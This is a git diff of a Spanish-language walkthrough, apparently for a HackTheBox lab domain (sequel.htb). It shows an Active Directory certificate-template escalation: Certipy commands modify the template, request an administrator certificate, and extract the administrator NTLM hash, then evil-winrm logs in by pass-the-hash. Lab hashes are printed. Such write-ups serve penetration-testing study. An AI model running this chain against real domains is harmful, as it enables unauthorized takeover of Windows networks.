@@ -330,16 +330,22 @@ Usamos la versión de Certipy 5.0.4
 certipy template -dc-ip 10.129.232.128 -u ca_svc -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target sequel.htb -write-default-configuration
 ```
 
-Obtenmos el certificado del usuario `Administrador` y nos lo traemos a nuestra maquina
-
-
-Verificamos que se haya realizado el cambio de contraseña
+Obtennos el certificado del usuario `Administrador` y nos lo traemos a nuestra maquina
 ```shell
-nxc smb sequel.htb -u ca_svc -p 'Password123!!'
+certipy req -u 'ca_svc@sequel.htb' -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
 ```
 
-Buscamos la vulnerabilidades del usuario
+Nos autenticamos con este certificado para obtener el hash
 ```shell
-certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.129.232.128 -stdout
+certipy auth -pfx administrator_3c00b508-04c8-48be-9ba2-cc00b7af5fb0.pfx -dc-ip 10.129.232.128
+```
+
+```c++
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+Nos conectamos al usuario `Administrador` con el hash obtenido
+```shell
+evil-winrm -i 10.129.232.128 -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
 ```
 
